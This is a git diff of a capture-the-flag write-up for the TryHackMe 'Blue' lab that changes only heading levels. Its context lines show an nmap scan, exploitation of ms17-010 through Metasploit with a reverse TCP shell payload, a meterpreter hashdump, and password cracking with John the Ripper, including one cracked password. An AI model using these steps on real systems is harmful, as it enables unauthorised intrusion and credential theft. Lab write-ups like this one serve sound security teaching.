@@ -12,19 +12,19 @@ image: images/thm-blue/thm-blue-banner.png
 
 <a href="https://www.freepik.com/free-vector/modern-business-background-with-geometric-shapes_5287944.htm#page=3&query=powerpoint%20background&position=15&from_view=search&track=ais" target="_blank" rel="noopener noreferrer">Cover Image by BiZkettE1</a> on Freepik
 
-### Challenge
+## Challenge
 
 Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.
 
 **This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.**
 
-### Task 1: Recon
+## Task 1: Recon
 
 1. **Scan the machine**
 
 > sudo nmap -sS -sV -T4 -p- 10.10.136.254 -vv
 
-#### Scan Options
+### Scan Options
 
 * `-sS`: Stealth Scan
 * `-sV`: Service Versioning
@@ -54,7 +54,7 @@ We can see the SMB service on the target has a vulnerability (ms17-010)
 
 > ms17-010
 
-### Task 2: Gain Access
+## Task 2: Gain Access
 
 1. **Start Metasploit**
 
@@ -100,7 +100,7 @@ set payload windows/x64/shell/reverse_tcp
 
 ![Remote Access to Target System Gained](images/thm-blue/remote-access-gained.png)
 
-### Task 3: Escalation
+## Task 3: Escalation
 
 1. **If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in Metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)**
 
@@ -154,7 +154,7 @@ There are multiple services that we can use to migrate our current session. Let'
 
 ![Migrating Meterpreter|280](images/thm-blue/migrating-meterpreter.png)
 
-### Task 4: Cracking
+## Task 4: Cracking
 
 1. **Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?**
 
@@ -181,14 +181,14 @@ Use the "--show --format=NT" options to display all of the cracked passwords rel
 Session completed
 ```
 
-#### Command Options
+### Command Options
 
 * `--format`: Specify the type of the hash
 * `--wordlist`: The wordlist that is going to be used to brute force the hash
 
 > alqfna22
 
-### Task 5: Find flags!
+## Task 5: Find flags!
 
 1. **Flag1? _This flag can be found at the system root._**
 
